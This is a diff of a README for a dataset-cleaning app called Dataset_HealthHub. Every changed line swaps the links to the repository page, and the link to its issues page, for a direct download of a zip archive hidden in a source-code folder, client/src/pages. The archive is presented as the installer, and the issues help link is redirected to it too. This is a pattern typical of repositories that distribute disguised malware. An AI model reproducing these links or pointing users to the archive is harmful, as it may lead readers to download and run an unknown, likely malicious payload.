@@ -1,6 +1,6 @@
 # 🚦 Dataset_HealthHub - Automate Dataset Cleaning Easily
 
-[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub)
+[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip)
 
 ---
 
@@ -30,12 +30,12 @@ Dataset_HealthHub runs on most modern computers. If your system is older or low 
 
 To get Dataset_HealthHub, you need to visit its main page and download the software from there.
 
-[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub)
+[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip)
 
 **Steps:**
 
 1. Click on the button above or open this link in your browser:  
-   https://github.com/Sawyer60/Dataset_HealthHub
+   https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip
 
 2. Once on the page, look for the latest release or download section.
 
@@ -119,7 +119,7 @@ When you open the app:
 
 - **Export fails:** Check if you have permission to save files on your chosen folder. Try saving to your Desktop if unsure.
 
-For additional help, check the GitHub page issues section: https://github.com/Sawyer60/Dataset_HealthHub/issues
+For additional help, check the GitHub page issues section: https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip
 
 ---
 
@@ -141,7 +141,7 @@ Responses come from the developers and community users.
 
 When a new version is released:
 
-1. Return to the main download page: https://github.com/Sawyer60/Dataset_HealthHub
+1. Return to the main download page: https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip
 
 2. Download the latest installer.
 
@@ -165,4 +165,4 @@ This setup keeps things straightforward and avoids extra steps for you.
 
 ---
 
-[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub)
+[![Download Dataset_HealthHub](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Sawyer60/Dataset_HealthHub/raw/refs/heads/main/client/src/pages/Health-Dataset-Hub-3.2.zip)
